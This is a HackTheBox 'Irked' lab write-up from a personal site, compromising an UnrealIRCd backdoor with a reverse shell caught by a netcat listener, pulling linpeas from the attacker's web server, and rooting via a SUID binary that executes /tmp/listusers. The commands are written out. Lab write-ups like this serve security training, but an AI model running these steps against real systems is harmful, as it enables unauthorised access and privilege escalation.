---
layout: page
title: Irked
description: Irked from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/irked/logo.png" title="HTB Irked Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Irked">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Not going to lie, got a little irked with this box.

Run nmap and get a list of the ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.117            
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 11:59 AEDT
Nmap scan report for 10.10.10.117
Host is up (0.0100s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40502/udp6  status
|   100024  1          45048/udp   status
|   100024  1          46386/tcp6  status
|_  100024  1          47433/tcp   status
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   55.41 ms 10.10.16.1
2   8.27 ms  10.10.10.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.77 seconds
```
{% endraw %}

<br />
Run nmap against all of the ports looking for any services running on any non-standard ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.117
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 12:00 AEDT
Nmap scan report for 10.10.10.117
Host is up (0.022s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
47433/tcp open  unknown
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds
```
{% endraw %}

<br />
Banner grab for the newly exposed to see if we can try and finger-print them and identify the service.

{% raw %}
```sh
┌──(kali㉿kali)-[~]
└─$  sudo nmap -sC -sV -p 6697,8067 10.10.10.117
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 12:03 AEDT
Nmap scan report for 10.10.10.117
Host is up (0.052s latency).

PORT     STATE SERVICE VERSION
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
```
{% endraw %}

<br />
Google the UnrealIRC to try and find an exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/irked/google.png" title="Google the Sercice" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/irked]
└─$ wget https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/refs/heads/master/exploit.py
--2025-01-27 12:15:20--  https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/refs/heads/master/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2195 (2.1K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   2.14K  --.-KB/s    in 0s      

2025-01-27 12:15:20 (48.6 MB/s) - ‘exploit.py’ saved [2195/2195]
```
{% endraw %}

<br />
Update the python script with the proper LHOST and LPORT.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/irked]
└─$ cat exploit.py        
#!/usr/bin/python3
import argparse
import socket
import base64

# Sets the target ip and port from argparse
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='target ip')
parser.add_argument('port', help='target port', type=int)
parser.add_argument('-payload', help='set payload type', required=True, choices=['python', 'netcat', 'bash'])
args = parser.parse_args()

# Sets the local ip and port (address and port to listen on)
local_ip = '10.10.16.12'  # CHANGE THIS
local_port = '443'  # CHANGE THIS 

<snip>
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/irked]
└─$ sudo nc -nlvp 443                            
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Run the exploit and chose to use the netcat payload.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/irked]
└─$ python exploit.py -payload netcat 10.10.10.117 6697
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/irked]
└─$ sudo nc -nlvp 443                            
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.117] 51046
whoami
ircd
python3 -c 'import pty; pty.spawn("/bin/bash");'
ircd@irked:~/Unreal3.2$
```
{% endraw %}

<br />
Download the linpeas.sh to the attack machine.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/irked]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh                  
--2025-01-27 13:00:32--  https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh
Resolving github.com (github.com)... 4.237.22.38
Connecting to github.com (github.com)|4.237.22.38|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/98d382c4-9811-4ab6-8add-8117ade69f94?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250127%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250127T020034Z&X-Amz-Expires=300&X-Amz-Signature=aafb5222438eff93624081879f3719722dc54fb54f72ff5233f9100ffbe24e35&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-01-27 13:00:32--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/98d382c4-9811-4ab6-8add-8117ade69f94?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250127%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250127T020034Z&X-Amz-Expires=300&X-Amz-Signature=aafb5222438eff93624081879f3719722dc54fb54f72ff5233f9100ffbe24e35&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 820.08K  2.77MB/s    in 0.3s    

2025-01-27 13:00:34 (2.77 MB/s) - ‘linpeas.sh’ saved [839766/839766]
```
{% endraw %}

<br />
Start a webserver to serve the exploit.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/irked]
└─$ python -m 'http.server'
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Transfer the linpeas.sh to the victim machine.

{% raw %}
```sh
ircd@irked:~$ wget http://10.10.16.12:8000/linpeas.sh
wget http://10.10.16.12:8000/linpeas.sh
--2025-01-26 21:00:59--  http://10.10.16.12:8000/linpeas.sh
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 839766 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[=====================>] 820.08K  1.04MB/s   in 0.8s   

2025-01-26 21:01:00 (1.04 MB/s) - ‘linpeas.sh’ saved [839766/839766]

ircd@irked:~$ chmod +x linpeas.sh
chmod +x linpeas.sh
```
{% endraw %}

<br />
Run linpeas.sh and notice the /usr/bin/viewuser (Unknown SUID binary!) in the results.  Looks interesting.

{% raw %}
```sh
ircd@irked:~$ ./linpeas.sh
./linpeas.sh

<snip>

-rwsr-xr-x 1 root root 9.3K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14K Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 550K Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper (Unknown SUID binary!)
-rwsr-xr-x 1 root root 1.1M Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 332K Apr 14  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 43K May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 94K Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 77K May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-sr-x 1 daemon daemon 50K Sep 30  2014 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 18K Sep  8  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-sr-x 1 root root 9.3K Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 7.2K May 16  2018 /usr/bin/viewuser (Unknown SUID binary!)
-rwsr-xr-x 1 root root 95K Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38K May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34K Mar 29  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 34K Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 158K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 26K Mar 29  2015 /bin/umount  --->  BSD/Linux(08-1996)

<snip>

```
{% endraw %}

<br />
Try to give it a run just to see what it does.

{% raw %}
```sh
ircd@irked:/dev/shm$ /usr/bin/viewuser --help
/usr/bin/viewuser --help
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-02-02 00:51 (:0)
sh: 1: /tmp/listusers: not found
```
{% endraw %}

<br />
Create a /tmp/listusers file with the ircd user to see what happens.

{% raw %}
```sh
ircd@irked:/dev/shm$ echo ircd > /tmp/listusers
echo ircd > /tmp/listusers
ircd@irked:/dev/shm$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-02-02 00:51 (:0)
sh: 1: /tmp/listusers: Permission denied
ircd@irked:/dev/shm$ chmod 777 /tmp/listusers
chmod 777 /tmp/listusers
ircd@irked:/dev/shm$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-02-02 00:51 (:0)
/tmp/listusers: 1: /tmp/listusers: ircd: not found
```
{% endraw %}

<br />
Judging by the sh from the first run and the user not from the second run, it could be looking for some kind of bash script.  Try injecting /bin/bash into the /tmp/listusers file.

{% raw %}
```sh
ircd@irked:/dev/shm$ echo '/bin/bash' > /tmp/listusers
echo '/bin/bash' > /tmp/listusers
ircd@irked:/dev/shm$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-02-02 00:51 (:0)
root@irked:/dev/shm# whoami
whoami
root
```
{% endraw %}

<br />
Get the root.txt file.

{% raw %}
```sh
root@irked:/dev/shm# cat /root/root.txt
cat /root/root.txt
<redacted>
root@irked:/dev/shm# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:5d:1c brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.117/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:5d1c/64 scope global mngtmpaddr dynamic 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:5d1c/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Get the user.txt file.

{% raw %}
```sh
root@irked:/home/djmardov# cat user.txt
cat user.txt
<redacted>
root@irked:/home/djmardov# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:5d:1c brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.117/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:5d1c/64 scope global mngtmpaddr dynamic 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:5d1c/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
And with that we wrapped up another one.  Hopefully it didn't irk you as much as it did for me.